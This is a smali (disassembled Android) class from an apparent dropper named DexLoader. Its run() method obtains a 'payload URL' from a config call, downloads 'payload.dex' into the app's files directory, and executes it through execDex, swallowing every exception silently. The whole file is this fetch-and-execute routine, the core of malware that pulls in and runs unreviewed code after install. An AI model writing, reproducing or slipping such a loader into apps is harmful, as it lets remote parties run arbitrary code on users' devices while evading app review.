.class final Lcom/ddl/DexLoader$1;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;
.source "DexLoader.java"

.field final synthetic val$context:Landroid/content/Context;

.method constructor <init>(Landroid/content/Context;)V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lcom/ddl/DexLoader$1;->val$context:Landroid/content/Context;
    return-void
.end method

.method public run()V
    .locals 5

    :try_start_0

    # v0 = fetchConfig() -> payload URL
    invoke-static {}, Lcom/ddl/DexLoader;->fetchConfig()Ljava/lang/String;
    move-result-object v0

    if-eqz v0, :goto_end

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z
    move-result v1
    if-nez v1, :goto_end

    # v1 = context
    iget-object v1, p0, Lcom/ddl/DexLoader$1;->val$context:Landroid/content/Context;

    # v2 = filesDir
    invoke-virtual {v1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;
    move-result-object v2

    # v3 = new File(filesDir, "payload.dex")
    new-instance v3, Ljava/io/File;
    const-string v4, "payload.dex"
    invoke-direct {v3, v2, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    # if (!dexFile.exists()) download
    invoke-virtual {v3}, Ljava/io/File;->exists()Z
    move-result v4
    if-nez v4, :skip_download

    invoke-static {v0, v3}, Lcom/ddl/DexLoader;->downloadFile(Ljava/lang/String;Ljava/io/File;)V

    :skip_download
    invoke-virtual {v3}, Ljava/io/File;->exists()Z
    move-result v4
    if-eqz v4, :goto_end

    # execDex(context, dexFile)
    invoke-static {v1, v3}, Lcom/ddl/DexLoader;->execDex(Landroid/content/Context;Ljava/io/File;)V

    :goto_end
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0
    return-void
.end method
